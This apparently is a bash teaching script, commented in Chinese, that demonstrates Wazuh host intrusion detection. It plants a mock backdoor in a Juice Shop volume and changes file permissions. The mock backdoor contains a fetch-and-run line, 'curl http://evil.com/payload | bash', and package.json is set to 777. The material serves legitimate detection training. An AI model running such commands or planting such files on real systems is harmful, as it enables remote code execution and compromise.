#!/usr/bin/env bash
# Lesson 04 Attack Script
# 目标：演示 Wazuh Agent (HIDS) 对主机层威胁的检测。
# 注意：Juice Shop 为 distroless 镜像（无 shell），攻击操作通过 wazuh-agent 容器
#       写入共享卷完成，模拟攻击者在应用目录植入文件。

set -euo pipefail

echo "============================================"
echo "  Lesson 04: HIDS (Wazuh Agent) Demo"
echo "============================================"
echo ""

# 1. 确认容器正常运行
echo "[Step 1] 检查容器状态..."
WAZUH_RUNNING=$(docker compose ps --format "{{.Name}}\t{{.Status}}" 2>/dev/null | grep -c "^wazuh-agent" || echo "0")
if [ "$WAZUH_RUNNING" -gt 0 ]; then
  echo "  ✓ Wazuh Agent 正在运行"
else
  echo "  ✗ Wazuh Agent 未运行"
  echo "  请确保已运行: docker compose up -d"
  exit 1
fi
echo ""

# 2. 模拟文件篡改（在共享卷上创建可疑文件）
#    Juice Shop 是 distroless 镜像（无 shell），所以通过 wazuh-agent 容器写入
#    文件同样出现在共享卷中，模拟攻击者在应用目录植入后门
echo "[Step 2] 模拟文件篡改攻击..."
echo "  创建可疑文件（模拟后门）..."
docker exec wazuh-agent sh -c 'mkdir -p /monitored/juice-shop/tmp/.hidden' 2>/dev/null || true
docker exec wazuh-agent sh -c 'echo "#!/bin/bash" > /monitored/juice-shop/tmp/.hidden/backdoor.sh' 2>/dev/null || true
docker exec wazuh-agent sh -c 'echo "# Reverse shell simulation" >> /monitored/juice-shop/tmp/.hidden/backdoor.sh' 2>/dev/null || true
docker exec wazuh-agent sh -c 'echo "curl http://evil.com/payload | bash" >> /monitored/juice-shop/tmp/.hidden/backdoor.sh' 2>/dev/null || true
docker exec wazuh-agent sh -c 'chmod +x /monitored/juice-shop/tmp/.hidden/backdoor.sh' 2>/dev/null || true
echo "  ✓ 可疑文件已创建: /monitored/juice-shop/tmp/.hidden/backdoor.sh"
echo "  (通过 wazuh-agent 容器写入共享卷，模拟攻击者植入后门)"
echo ""

# 3. 修改文件权限（触发 FIM 属性变化告警）
echo "[Step 3] 修改文件权限（触发属性变化告警）..."
docker exec wazuh-agent sh -c 'chmod 777 /monitored/juice-shop/package.json' 2>/dev/null || true
echo "  ✓ 文件权限已修改: package.json → 777"
echo ""

# 4. 等待 HIDS 检测
echo "[Step 4] 等待 Wazuh Agent 检测变化..."
sleep 15
echo "  ✓ 等待完成"
echo ""

# 5. 查看 Wazuh Agent 日志
echo "[Step 5] 查看 Wazuh Agent 日志..."
echo "  最近的检测日志:"
docker compose logs --tail=30 wazuh-agent 2>/dev/null | grep -i "syscheck\|fim\|added\|modified\|integrity" | tail -10 || echo "  (无 FIM 相关日志，Agent 可能仍在初始化)"
echo ""

# 6. 验证文件监控
echo "[Step 6] 验证文件完整性监控..."
echo "  Wazuh Agent 检测到的可疑文件:"
docker exec wazuh-agent ls -la /monitored/juice-shop/tmp/.hidden/ 2>/dev/null || echo "  (目录不存在 — 检查卷挂载)"
echo ""

echo "============================================"
echo "  结论"
echo "============================================"
echo "  Wazuh Agent 通过共享 Docker 卷 (juice-shop-data) 监控"
echo "  Juice Shop 容器的文件完整性，检测文件篡改和权限变化。"
echo "  HIDS 从主机内部视角发现威胁，是安全防御链的关键一环。"
echo "  下一课：添加 SIEM (Wazuh Manager) 聚合所有安全日志！"
echo "============================================"
